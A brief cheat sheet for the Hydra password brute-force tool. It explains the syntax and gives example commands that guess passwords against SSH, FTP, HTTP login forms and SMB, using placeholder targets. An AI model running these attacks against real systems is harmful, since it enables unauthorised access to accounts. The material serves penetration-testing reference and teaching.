# Hydra Cheat Sheet

## Basic Syntax
```bash
hydra -l <username> -P <password_list> <target> -t <threads> -s <port> <protocol>
```
- `-l <username>`: Specify the username.
- `-P <password_list>`: Path to the password list.
- `-t <threads>`: Number of parallel threads.
- `-s <port>`: Specify the target port.
- `<protocol>`: Protocol to attack (e.g., ssh, ftp, http).

---

## Common Usage Examples

### SSH Bruteforce
```bash
hydra -l root -P passwords.txt <IP> ssh
```

### FTP Bruteforce
```bash
hydra -l anonymous -P passwords.txt <IP> ftp
```

### HTTP Form Bruteforce
```bash
hydra -l admin -P passwords.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```
- `^USER^`: Placeholder for the username.
- `^PASS^`: Placeholder for the password.
- `F=incorrect`: Failure condition to identify failed attempts.

### SMB Bruteforce
```bash
hydra -l admin -P passwords.txt <IP> smb
```

---
